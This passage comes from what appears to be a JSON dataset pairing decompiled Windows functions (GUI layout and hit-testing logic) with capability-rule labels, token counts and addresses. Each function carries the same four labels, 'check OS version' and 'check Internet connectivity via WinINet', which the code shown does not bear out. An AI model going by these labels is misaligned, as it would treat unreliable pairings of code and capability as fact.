        "decompiled_code": "\nint32_t __fastcall fcn.0045a684(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.0045a514(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack20 - iStack28;\n        }\n        else {\n            iVar2 = iStack24 - iStack32;\n        }\n    }\n    else {\n        for (; iVar2 != *(*(in_EAX + 0x1c) + 100); iVar2 = *(iVar2 + 0x14)) {\n            if (param_2 == *(*(iVar2 + 0x14) + 0x10)) {\n                iVar2 = fcn.0045aa58();\n                iVar1 = fcn.0045a570();\n                return iVar2 - iVar1;\n            }\n        }\n        if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n            iVar2 = *(*(in_EAX + 0x1c) + 0x68);\n        }\n        else {\n            iVar2 = fcn.0045aa58();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 451
    },
    "0045a73c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0045a73c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0045a514();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.0045ab5c();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.0045a684();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.0045a684();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.0045a514();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.0045aa80();\n            }\n            else {\n                fcn.0045a570();\n                fcn.0045aa80();\n            }\n            fcn.0045a8dc();\n            iVar1 = fcn.0045ab34();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 292
    },
    "0045a7e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a7e4(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040dbb8();\n            fcn.00404ec4();\n        }\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0045a828": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0045a85d)\n\nuint fcn.0045a828(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0040484c();\n    return 0;\n}\n",
        "token_count": 80
    },
    "0045a8dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a8dc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x90) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.0045a684();\n    iVar2 = fcn.0045a684();\n    cVar1 = fcn.0045a8ac(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.0045ab34();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.0045aa58(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x0045aa05;\n        iVar3 = fcn.0045aa58();\n        iVar4 = fcn.0045aa58();\n        if (iVar4 <= iVar3) goto code_r0x0045aa05;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x0045aa05:\n    arg_8h = &var_14h;\n    uVar5 = fcn.0045a600();\n    fcn.0045a600(uVar5);\n    fcn.00418470(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.004501d4();\n    return;\n}\n",
        "token_count": 676
    },
    "0045ad54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ad54(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.0045ad54(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.0045ad54(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0045adac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045adac(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.0045ad54(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "0045aeb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0045aeb0(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    uint8_t uVar4;\n    int32_t in_EDX;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x90))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.00450834();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.00450820();\n                    }\n                }\n                fcn.00418470(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.004501d4();\n                iVar1 = fcn.0045a4dc();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.0045adac();\n                if (iVar2 != 0) {\n                    fcn.0045c000();\n                }\n                var_8h = fcn.0045adac();\n                var_9h = *(var_1h + 0x492760);\n                iVar2 = fcn.0045a500();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.0045a684();\n                        fcn.0045aa80();\n                        uVar3 = fcn.0045a684();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.0045a684();\n                        fcn.0045aa80();\n                        uVar3 = fcn.0045a684();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.0045a4dc();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.0045b274(*(var_1h + 0x492768));\n                }\n                else {\n                    fcn.0045b0cc(*(var_1h + 0x492768), var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.0045a8dc();\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1034
    },
    "0045b0cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b0cc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.0045a4dc();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.0045aa80();\n        uVar3 = fcn.0045aa58();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045ae14(0x45c388);\n            uVar4 = fcn.0045aa58();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.0045ae14(0x45c7d8);\n            fcn.0045aa58();\n            fcn.0045aa80();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045ae14(0x45c388);\n        }\n        fcn.0045ae14(0x45c910);\n    }\n    else {\n        fcn.0045aa58();\n        fcn.0045aa80();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        *(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.0045a73c();\n    fcn.0045aad4();\n    fcn.0045ae14(0x45c910);\n    return;\n}\n",
        "token_count": 973
    },
    "0045b2ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0045b2ec(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar1 = fcn.0045a600();\n    iVar2 = fcn.0045a600();\n    if (*(in_EAX + 0x1c) == '\\0') {\n        if (((iVar2 <= *in_ECX) && (*in_ECX <= *(in_EAX + 0x18) + iVar2)) && (iVar1 <= in_ECX[1])) {\n            iVar2 = fcn.0045a684();\n            if (in_ECX[1] <= iVar1 + iVar2) {\n                var_5h = 1;\n                if (in_ECX[1] < *(*(in_EDX + 4) + 0x44) + 0xf) {\n                    *arg_8h = 0x14;\n                }\n                else {\n                    *arg_8h = 2;\n                }\n            }\n        }\n    }\n    else if (((iVar1 <= in_ECX[1]) && (in_ECX[1] <= iVar1 + *(in_EAX + 0x18))) && (iVar2 <= *in_ECX)) {\n        iVar1 = fcn.0045a684();\n        if (*in_ECX <= iVar1 + iVar2) {\n            var_5h = 1;\n            if (*(*(in_EDX + 4) + 0x40) + *(*(in_EDX + 4) + 0x48) + -0xf < *in_ECX) {\n                *arg_8h = 0x14;\n            }\n            else {\n                *arg_8h = 2;\n            }\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 443
    },
    "0045b3f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0045b3f0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uchar *puStack40;\n    uint uStack36;\n    uchar auStack20 [4];\n    \n    iVar2 = fcn.004546e8();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.004546ac();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004047dc(),  cVar1 == '\\0' || (*(piVar3 + 0x1da) != '\\0'))))\n            {\n                fcn.00418420();\n                (**(*piVar3 + 0x44))(puStack40, uStack36);\n                puStack40 = auStack20;\n                iVar4 = sub.user32.dll_PtInRect();\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 268
    },
    "0045b47c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b47c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.0045aa58();\n        if (*(*(arg_8h + -4) + 4) <= iVar2) {\n            iVar2 = fcn.0045aa58();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045b53f;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar2 = fcn.0045aa58();\n        if (**(arg_8h + -4) <= iVar2) {\n            iVar2 = fcn.0045aa58();\n            if (iVar2 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x0045b53f;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        cVar1 = (**(**(arg_8h + -8) + 0x40))(*(arg_8h + -0xc));\n        if (cVar1 != '\\0') {\n            *(arg_8h + -0x10) = in_EAX;\n        }\n    }\ncode_r0x0045b53f:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0045ab34();\n        if (iVar2 != 0) {\n            iVar2 = arg_8h;\n            fcn.0045ab34();\n            fcn.0045b47c(iVar2);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0045ab5c();\n        if (iVar2 != 0) {\n            fcn.0045ab5c();\n            fcn.0045b47c(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 592
    },
    "0045b590": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045b590(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.0045b3f0();\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0x94))) {\n        iVar2 = fcn.0045ab5c();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.0045ab5c();\n            fcn.0045b47c(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.0045adac();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 263
    },
    "0045b618": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b618(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00405530();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.00405c6c();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045b660": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045b660(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint uVar6;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uchar var_26h;\n    int32_t var_25h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack92 = 0x45b9a3;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.0045bf64();\n    var_25h._0_1_ = *(var_ch + 0x1d);\n    fcn.0045ad3c();\n    uVar6 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    (**(*var_4h + 0xc))();\n    if (var_1ch == 0x40000) {\n        *(var_ch + 0x1d) = 0;\n        var_26h = 0;\n    }\n    else if (var_ch[0x1c] == var_1ch) {\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n    }\n    else {\n        var_40h = var_ch[0x1c];\n        var_3ch._0_1_ = 0;\n        var_38h = var_1ch;\n        var_34h._0_1_ = 0;\n        arg_ch = &var_40h;\n        uVar4 = 1;\n        fcn.00407550();\n        fcn.0040db38(uVar4, arg_ch);\n        fcn.00404ec4();\n    }\n    (**(*var_4h + 0xc))();\n    if (-1 < var_20h + -1) {\n        var_30h = var_20h;\n        var_1ch = 0;\n        do {\n            fcn.0045b618(&stack0xfffffffc);\n            if (var_8h != 0) {\n                fcn.0040484c();\n                if (var_10h != 0) {\n                    fcn.004507b4();\n                    uVar6 = 0;\n                    fcn.00451694(0);\n                }\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    (**(*var_4h + 0xc))();\n    if (*(var_ch + 0x1d) != '\\0') {\n        (**(*var_ch + 0x28))();\n        iVar2 = fcn.0045d054();\n        var_ch[0x1a] = iVar2;\n    }\n    var_18h = 0;\n    iVar2 = 0;\ncode_r0x0045b7fe:\n    do {\n        (**(*var_4h + 0xc))();\n        if (var_14h == *0x492770) {\n            *in_FS_OFFSET = uVar6;\n            *(var_ch + 0x1d) = var_25h;\n            if (var_ch[0x19] == 0) {\n                iVar2 = fcn.0045a4dc();\n                var_ch[0x19] = iVar2;\n            }\n            fcn.0045ad40();\n            return;\n        }\n        iVar3 = fcn.0045a4dc();\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n        if (*(var_ch + 0x1d) != '\\0') {\n            (**(*var_ch + 0x28))();\n            uVar4 = fcn.0045d054();\n            *(iVar3 + 0x20) = uVar4;\n        }\n        fcn.0045b618(&stack0xfffffffc);\n        if (var_8h != 0) {\n            cVar1 = fcn.0045a828();\n            if (cVar1 == '\\0') {\n                fcn.00404650();\n                goto code_r0x0045b7fe;\n            }\n        }\n        if (var_14h == 0) {\n            var_ch[0x19] = iVar3;\n        }\n        else if (var_14h == var_18h) {\n            iVar5 = iVar2;\n            if ((*(iVar2 + 0x18) != 0) && (*(iVar2 + 4) == 0)) {\n                iVar5 = *(iVar2 + 0x18);\n                var_2ch = iVar2;\n                fcn.00404650();\n            }\n            *(iVar5 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = iVar5;\n            *(iVar3 + 0x14) = *(iVar5 + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(iVar2 + 8) = iVar3;\n            *(iVar3 + 0x14) = iVar2;\n        }\n        else if (var_14h < var_18h) {\n            unique0x10000202 = iVar2;\n            if (0 < var_18h - var_14h) {\n                var_1ch = 1;\n                var_30h = var_18h - var_14h;\n                do {\n                    unique0x00007a00 = *(stack0xffffffd8 + 0x14);\n                    var_1ch = var_1ch + 1;\n                    var_30h = var_30h + -1;\n                } while (var_30h != 0);\n            }\n            *(stack0xffffffd8 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = stack0xffffffd8;\n            *(iVar3 + 0x14) = *(stack0xffffffd8 + 0x14);\n        }\n        var_18h = var_14h;\n        iVar2 = iVar3;\n    } while( true );\n}\n",
        "token_count": 1573
    },
    "0045bc80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bc80(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x45bc99;\n    var_4h = fcn.00425108();\n    uStack52 = 0x45bda4;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x45bcb5;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044f140();\n    puStack60 = 0x45bcbd;\n    fcn.004253d0();\n    uStack64 = 0x45bd87;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x45bcd5;\n    puStack60 = &stack0xfffffffc;\n    fcn.0042579c();\n    uStack76 = 0x45bd6a;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.004546e8();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.004546ac();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0x94) == in_EAX[5])) {\n                fcn.004501b4();\n                (***in_EAX)();\n                (**(*in_EAX + 4))();\n                (**(*in_EAX + 0x20))(&fcn.0045bc80::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x45bd71;\n    uStack76 = 0x45bd69;\n    fcn.0042579c();\n    return;\n}\n",
        "token_count": 576
    },
    "0045bdb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bdb4(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.00457040();\n    if (((in_ECX == 0) || (*(in_ECX + 0x90) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.00450254();\n        arg_8h_00 = &var_1ch;\n        fcn.00450210();\n        fcn.00418448(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                arg_8h[3] = arg_8h[3] / 2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                arg_8h[2] = arg_8h[2] / 2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = 